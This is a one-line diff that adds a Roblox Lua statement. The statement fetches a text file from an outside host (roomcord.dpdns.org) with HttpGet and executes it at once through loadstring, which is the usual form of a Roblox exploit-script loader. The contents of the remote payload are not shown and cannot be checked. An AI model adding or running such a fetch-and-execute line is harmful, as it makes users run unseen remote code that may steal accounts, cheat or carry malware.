@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://roomcord.dpdns.org/s/mZIJnrDN.txt"))()
